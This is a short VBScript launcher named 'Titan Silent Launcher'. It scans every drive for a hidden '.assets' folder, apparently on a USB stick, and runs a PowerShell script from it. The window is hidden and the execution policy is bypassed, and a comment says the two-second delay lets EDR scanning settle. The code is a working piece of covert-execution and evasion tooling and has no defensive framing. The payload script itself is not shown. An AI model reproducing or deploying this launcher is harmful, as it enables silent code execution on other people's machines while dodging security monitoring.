' --- [AWK] Titan Silent Launcher ---
Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' 2-second delay to let EDR "On-Access" scan settle
WScript.Sleep 2000 

Set drives = fso.Drives
assetPath = ""

For Each d In drives
    If d.IsReady Then
        ' Checking for the folder on the root of each drive
        If fso.FolderExists(d.Path & "\.assets") Then
            assetPath = d.Path & "\.assets"
        End If
    End If
Next

' MATCHING YOUR FILENAME: who_am_i.ps1
If assetPath <> "" Then
    strArgs = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & assetPath & "\who_am_i.ps1"""
    objShell.Run strArgs, 0, False
Else
    ' Only shows if the USB is not detected properly
    MsgBox "Error: AWK Assets folder not found.", 16, "Titan Framework"
End If
